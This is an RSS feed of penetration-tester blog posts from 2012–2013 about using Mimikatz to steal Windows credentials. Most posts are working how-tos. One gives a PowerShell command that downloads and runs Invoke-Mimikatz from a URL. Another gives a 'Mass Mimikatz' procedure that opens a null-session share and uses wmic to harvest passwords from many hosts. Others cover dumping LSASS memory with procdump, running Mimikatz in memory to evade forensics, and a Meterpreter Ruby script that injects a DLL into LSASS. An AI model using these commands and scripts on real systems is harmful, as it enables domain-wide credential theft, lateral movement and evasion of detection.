<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Mimikatz on room362com</title>
    <link>//room362.com/categories/mimikatz/</link>
    <description>Recent content in Mimikatz on room362com</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Sat, 05 Oct 2013 23:53:52 -0500</lastBuildDate>
    <atom:link href="//room362.com/categories/mimikatz/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Dumping a domain worth of passwords with mimikatz</title>
      <link>//room362.com/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/</link>
      <pubDate>Sat, 05 Oct 2013 23:53:52 -0500</pubDate>
      
      <guid>//room362.com/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://clymb3r.wordpress.com/&#34;&gt;clymb3r&lt;/a&gt; recently posted a script called &amp;ldquo;&lt;a href=&#34;https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz&#34;&gt;Invoke-Mimikatz.ps1&lt;/a&gt;&amp;rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL.&lt;/p&gt;

&lt;p&gt;You can very easily use this script directly from an admin command prompt as so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(This works REALLY well for Citrix and Kiosk scenarios and it&amp;rsquo;s too hard to type/remember)
This runs the powershell script by directly pulling it from Github and executing it &amp;ldquo;in memory&amp;rdquo; on your system.&lt;/p&gt;

&lt;p&gt;One of the awesome added capabilities for this script is to run on a list of hosts. as so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds -ComputerName @(&#39;computer1&#39;, &#39;computer2&#39;)&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This works great as all the output is directly on your system and all executed through Powershell Remoting. &lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/ee706585(v=vs.85&#34;&gt;Powershell Remoting&lt;/a&gt;.aspx&amp;rdquo;) is pretty much the same as WinRM. This service however is not enabled by default and can be pretty hit or miss on how much any given enterprise uses WinRM. However, it is usually the servers and more important systems that have it enabled more often than not.&lt;/p&gt;

&lt;p&gt;You can find WinRM / PowerShell Remoting by scanning for the service port 47001 as well as the default comm ports for WinRM 5985 (HTTP) and 5986 (HTTPS).&lt;/p&gt;

&lt;p&gt;If you find that your target isn&amp;rsquo;t a WinRM rich environment or you just want more passwords you can take a slightly more painful route, I call it &amp;ldquo;Mass Mimikatz&amp;rdquo;&lt;/p&gt;

&lt;p&gt;Step 1. Make a share, we are doing this so we can not only collect the output of all our computers passwords, but to host the CMD batch file that will run the powershell script:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd\
mkdir open
net share open=C:\open /grant:everyone,full
icacls C:\open\ /grant Everyone:(OI)(CI)F /t
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We are setting &amp;ldquo;Everyone&amp;rdquo; permissions on a Share (net share) and NTFS (icacls) level for this to work properly.&lt;/p&gt;

&lt;p&gt;Step 2. Set registry keys. There are two registry keys that we need to set. The first allows Null Sessions to our new share and the second allows null users to have the &amp;ldquo;Everyone&amp;rdquo; token so that we don&amp;rsquo;t have to get crazy with our permissions. I have create a meterpreter script that has a bunch of error checking here: &lt;a href=&#34;https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/massmimi_reg.rb&#34;&gt;massmimi_reg.rb&lt;/a&gt;
or you can just make the following changes&amp;rdquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ  = open
HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp;quot; = 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step 3. Change directory into new &amp;ldquo;open&amp;rdquo; directory. This is so our uploads and in particular our web server will be hosted out of the correct directory.&lt;/p&gt;

&lt;p&gt;Step 4. Upload powershell script &lt;a href=&#34;https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/powermeup.cmd&#34;&gt;powermeup.cmd&lt;/a&gt; - this script will run our hosted Invoke-Mimikatz script on each host:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.127:8080/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCreds &amp;gt; \\192.168.1.127\open\%COMPUTERNAME%.txt 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step 5. Upload &lt;a href=&#34;http://clymb3r.wordpress.com/&#34;&gt;clymb3r&lt;/a&gt;&amp;rsquo;s Invoke-Mimikatz ps1 - Download from &lt;a href=&#34;https://github.com/mattifestation/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt; repo: &lt;a href=&#34;https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#34;&gt;source on github&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Step 6. Upload mongoose: &lt;a href=&#34;http://cesanta.com/downloads.html&#34;&gt;Downloads Page&lt;/a&gt; - Both regular and tiny versions work. This is an awesome, single executable webserver that supports LUA, Sqlite, and WebDAV out of the box. Tiny version is under 100k.&lt;/p&gt;

&lt;p&gt;Step 7. Upload serverlist.txt - This is a line by line list of computer names to use mimikatz on. You&amp;rsquo;ll have to gather this one way or another.&lt;/p&gt;

&lt;p&gt;Step 8. Execute mongoose (from directory with mimikatz.ps1) - This will start a listener with directory listings enabled on port 8080 by default&lt;/p&gt;

&lt;p&gt;Step 9a. Execute wmic:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wmic /node:@serverlist.txt process call create &amp;quot;\\192.168.92.127\open\powershellme.cmd&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step 9b. Execute wmic with creds:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wmic /node:@serverlist.txt /user:PROJECTMENTOR\jdoe /password:ASDqwe123 process call create &amp;quot;\\192.168.92.127\open\powershellme.cmd&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step 10. Watch as text files full of wonder and joy fill your share.&lt;/p&gt;

&lt;p&gt;You can find the scripts here: &lt;a href=&#34;https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz&#34;&gt;https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Don&amp;rsquo;t forget to clean up::&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;kill mongoose process&lt;/li&gt;
&lt;li&gt;net share open /delete&lt;/li&gt;
&lt;li&gt;kill/reset registry values&lt;/li&gt;
&lt;li&gt;delete &amp;ldquo;open&amp;rdquo; directory&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Got a better way of getting this done? Please leave a comment.&lt;/p&gt;

&lt;p&gt;P.S. You could just enable Powershell Remoting for them ;)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d powershell.exe &amp;quot;enable-psremoting -force&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201310_multimimi_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</title>
      <link>//room362.com/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</link>
      <pubDate>Fri, 07 Jun 2013 15:00:08 +0000</pubDate>
      
      <guid>//room362.com/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</guid>
      <description>&lt;p&gt;Mimikatz is now &lt;a href=&#34;https://github.com/rapid7/meterpreter/pull/9&#34;&gt;built into Metasploit&amp;rsquo;s meterpreter&lt;/a&gt;, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.&lt;/p&gt;

&lt;p&gt;Mimikatz Minidump: &lt;a href=&#34;http://blog.gentilkiwi.com/securite/mimikatz/minidump&#34;&gt;http://blog.gentilkiwi.com/securite/mimikatz/minidump&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Procdump: &lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&#34;&gt;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net use \\TARGETBOXC$ /user:DOMAIN\serviceaccount serviceaccount123
dir \\TARGETBOX\C$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If that works then we want to check that we can all the &amp;ldquo;AT&amp;rdquo; command on the remote host:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;at \\TARGETBOX
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All set. Next lets prep our workspace on the remote host. We are using the C:\Temp directory.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkdir \\TARGETBOX\C$\Temp
dir \\TARGETBOX\C$\Temp
copy c:\temp\procdump.exe \\TARGETBOXC$
copy c:\temp\procdump.bat \\TARGETBOXC$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The contents of procdump.bat are:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;@echo off
C:\temp\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I&amp;rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&amp;rsquo;ve dumped more than one IP that is actually the same host.&lt;/p&gt;

&lt;p&gt;Next we schedule the task. Use net time to determine the local time for the remote machine.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net time \\TARGETBOX
at \\TARGETBOX 13:52 C:\Temp\procdump.bat
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pull down the file and clean up:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dir \\TARGETBOX\C$\Temp
copy \\TARGETBOX\C$\Temp\*lsass.dmp C:\temp\output\
rmdir /s \\TARGETBOX\C$\Temp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:&lt;a href=&#34;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&#34;&gt;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Load up the Alpha version of Mimikatz, switch it to minidump mode and you&amp;rsquo;re dumping creds:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
Switch to MINIDUMP

mimikatz # sekurlsa::logonPasswords full
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats it. Password dumping without ever using a &amp;ldquo;Hacker&amp;rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Sessiondump Meterpreter Extension</title>
      <link>//room362.com/post/2013/2013-04-08-sessiondump-meterpreter-extension/</link>
      <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
      
      <guid>//room362.com/post/2013/2013-04-08-sessiondump-meterpreter-extension/</guid>
      <description>&lt;p&gt;Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory &lt;a href=&#34;//room362.com/blog/2012/9/6/completely-in-memory-mimikatz-with-metasploit.html&#34;&gt;{link}&lt;/a&gt; - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.&lt;/p&gt;

&lt;p&gt;Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201304_sessiondump_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;No blog post or huge Vegas lights talk on it at DefCon or Blackhat. Just posted online in a corner of the Internet:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201304_sessiondump_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.hsc.fr/ressources/outils/sessiondump/&#34;&gt;http://www.hsc.fr/ressources/outils/sessiondump/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Before we get started lets be clear about one thing. Sessiondump while awesome doesn&amp;rsquo;t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),.&lt;/p&gt;

&lt;p&gt;Without further ado lets go ahead and get the file and do a bunch of extracting. &lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201304_sessiondump_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201304_sessiondump_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And finally placing everything in it&amp;rsquo;s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201304_sessiondump_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Cool, everything should be good to go. Lets use this thing. I&amp;rsquo;m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NT\AUTHORITY SYSTEM.  After that it&amp;rsquo;s cake, load the extension:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201304_sessiondump_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the available commands:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201304_sessiondump_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And run getHashes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201304_sessiondump_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;or getwDigestPasswords:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201304_sessiondump_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Thats is, you free passwords, YAY&amp;hellip;&lt;/p&gt;

&lt;p&gt;Possible issues you may run into:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If you are on a x64 box and meterpreter isn&amp;rsquo;t running in a x64 process it will fail saying that it doesn&amp;rsquo;t have the correct version offsets, here is how you can check:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201304_sessiondump_10.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&amp;rsquo;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201304_sessiondump_11.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Thats all for now folks, may the shells be with you.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Completely In-memory Mimikatz with Metasploit</title>
      <link>//room362.com/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/</link>
      <pubDate>Thu, 06 Sep 2012 03:16:47 +0000</pubDate>
      
      <guid>//room362.com/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/</guid>
      <description>&lt;p&gt;Executing WCE.exe in memory as demoed by Egypt here: &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&#34;&gt;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&lt;/a&gt; has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&amp;rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201209_mimikatz_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(yes I realize I&amp;rsquo;m running this on disk &amp;lsquo;wce32.exe&amp;rsquo;, but it exhibits the same DLL drop when doing in-memory)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Now, don&amp;rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&amp;rsquo;s the best tool for the job. And today, that&amp;rsquo;s now Mimikatz. &lt;/p&gt;

&lt;p&gt;Just like WCE to execute it in memory you use the -m flag for execute:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;meterpreter&amp;gt; execute -H -i -c -m -d calc.exe -f mimikatz.exe -a &#39;&amp;quot;sekurlsa::logonPasswords full&amp;quot; exit&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;For mimikatz to automatically send commands require double quotes in the command line arguments, so we use single quotes in meterpreter to encircle the execute arguments (-a). Running first &amp;ldquo;sekurlsa::logonPasswords full&amp;rdquo; then &amp;lsquo;exit&amp;rsquo; to auto-exit mimikatz console. Like so:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201209_mimikatz_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And all you get forensically is calc.exe loading a ton of DLLs it has no business loading but no new files touch disk ;-)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201209_mimikatz_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The downloads for Mimikatz are were they always are: &lt;a href=&#34;http://blog.gentilkiwi.com/mimikatz&#34;&gt;http://blog.gentilkiwi.com/mimikatz&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Oh, did I mention that Mimikatz is open source and the in-memory goodness has been uploaded to svn: &lt;a href=&#34;https://code.google.com/p/mimikatz/&#34;&gt;https://code.google.com/p/mimikatz/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Awesome work &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you want to check out the the fix that was implemented to work with Meterpreter&amp;rsquo;s in-memory goodness check here: &lt;a href=&#34;https://code.google.com/p/mimikatz/source/detail?r=33&#34;&gt;https://code.google.com/p/mimikatz/source/detail?r=33&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Integration of Mimikatz into Metasploit Stage1</title>
      <link>//room362.com/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</link>
      <pubDate>Fri, 15 Jun 2012 14:55:55 +0000</pubDate>
      
      <guid>//room362.com/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</guid>
      <description>&lt;p&gt;One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.&lt;/p&gt;

&lt;p&gt;Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&amp;rsquo;ll get there in the subsequent posts.&lt;/p&gt;

&lt;p&gt;Ignore the do_cmd for now and I stepped through &lt;a href=&#34;//room362.com/blog/2011/5/30/remote-dll-injection-with-meterpreter.html&#34;&gt;remote DLL injection here&lt;/a&gt;. So the first odd lines is &lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;handle = client.railgun.kernel32.CreateNamedPipeW(&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;, &#39;PIPE_ACCESS_DUPLEX&#39;, &#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;, 1, 0, 0, 30000,nil)[&#39;return&#39;]
connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Essentially these connect to the &lt;a href=&#34;http://en.wikipedia.org/wiki/Named_pipe&#34;&gt;Named Pipe&lt;/a&gt; that the sekurlsa.dll uses to talk to the mimikatz.exe in it&amp;rsquo;s normal operation. Then we just use the windows API call &amp;ldquo;ReadFile&amp;rdquo; from there on out.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One of the draw backs to doing this all remotely is that Railgun doesn&amp;rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&amp;rsquo;ve overcome this for the initial &amp;ldquo;banner&amp;rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &amp;ldquo;ping&amp;rdquo; and &amp;ldquo;getLogonPasswords&amp;rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)&lt;/p&gt;

&lt;p&gt;If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!&lt;/p&gt;

&lt;p&gt;Meterpreter Script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;def do_cmd(handle,cmd)
	ucommand = Rex::Text.to_unicode(cmd)
	sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil)
	good2go = false
	newline = false
	readstring = []
	while good2go == false
		# Have to pull data 1 unicode character at a time
		# this is because the pipe won&#39;t write or read if
		# too much was written or read by the &amp;quot;client&amp;quot; (us)
		pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil)
		# Check to see if our end of read check is there: n000 @00
		if pull[&#39;lpBuffer&#39;] == &amp;quot;@00&amp;quot; and newline == true
			good2go = true
		else
			readstring &amp;lt;&amp;lt; pull[&#39;lpBuffer&#39;]
		end
		
		# Ready the newline var for previous check on next loop
		if pull[&#39;lpBuffer&#39;] == &amp;quot;n00&amp;quot;
			newline = true
		else
			newline = false
		end
	end
	
	print_status(readstring.join(&amp;quot;&amp;quot;))
end

print_status(&amp;quot;x86 Detected - Using x86 mimikatz&amp;quot;)
handle = client.railgun.kernel32.CreateNamedPipeW(&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;, &#39;PIPE_ACCESS_DUPLEX&#39;, &#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;, 1, 0, 0, 30000,nil)[&#39;return&#39;]
print_status(&amp;quot;Handle: #{handle}&amp;quot;)
framework.threads.spawn(&#39;injectlsass&#39;,false) {
	pid = client.sys.process[&#39;lsass.exe&#39;]
	print_status(&amp;quot;LSASS located at PID: #{pid}&amp;quot;)
	pathtomimi = &amp;quot;C:\\sekurlsa.dll&amp;quot;

	pay = client.framework.payloads.create(&amp;quot;windows/loadlibrary&amp;quot;)
	pay.datastore[&amp;quot;DLL&amp;quot;] = pathtomimi
	pay.datastore[&amp;quot;EXITFUNC&amp;quot;] = &#39;thread&#39;

	raw = pay.generate
	targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
	mem = targetprocess.memory.allocate(raw.length + (30024))
	targetprocess.memory.write(mem, raw)
	sleep(2)
	targetprocess.thread.create(mem, 0)
	print_status(&amp;quot;Successfully Injected into LSASS&amp;quot;)
}
print_status(&amp;quot;Waiting for LSASS injection to complete&amp;quot;)
connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
print_status(&amp;quot;Mimikatz has called home, ready for command&amp;quot;)
sleep(2)
print_status(&amp;quot;Reading banner&amp;quot;)
client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
print_status(&amp;quot;Doing a quick ping to make sure things are working...&amp;quot;)
do_cmd(handle,&#39;ping&#39;)
print_status(&amp;quot;If you made it this far it worked, doing getLogonPasswords&amp;quot;)
do_cmd(handle, &#39;getLogonPasswords&#39;)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>phDays in Moscow</title>
      <link>//room362.com/post/2012/2012-04-26-phdays-in-moscow/</link>
      <pubDate>Thu, 26 Apr 2012 21:33:58 +0000</pubDate>
      
      <guid>//room362.com/post/2012/2012-04-26-phdays-in-moscow/</guid>
      <description>&lt;p&gt;A friend of mine is presenting at phDays in Moscow at the end of May. If you are in the area, or can be, I would highly recommend you attend, and in particularly his talk.&lt;/p&gt;

&lt;p&gt;His blog is here: &lt;a href=&#34;http://blog.gentilkiwi.com/&#34;&gt;http://blog.gentilkiwi.com/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And since a picture is worth a thousand words:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201204_phdays_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;You should really go check out what he is going to present&amp;hellip; just sayin&amp;rsquo;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>